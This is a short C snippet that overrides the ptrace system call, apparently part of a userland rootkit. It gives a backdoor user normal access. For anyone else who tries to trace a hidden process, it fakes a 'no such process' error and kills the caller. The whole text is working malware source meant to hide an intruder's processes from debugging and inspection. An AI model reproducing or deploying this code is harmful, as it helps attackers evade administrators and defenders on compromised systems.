long ptrace(void *request, pid_t pid, void *addr, void *data){
    hook(CPTRACE);
    if(is_bdusr()) return (long)call(CPTRACE, request, pid, addr, data);

    if(hidden_proc(pid)){
        errno = ESRCH;
        exit(-1);
    }

    return (long)call(CPTRACE, request, pid, addr, data);
}
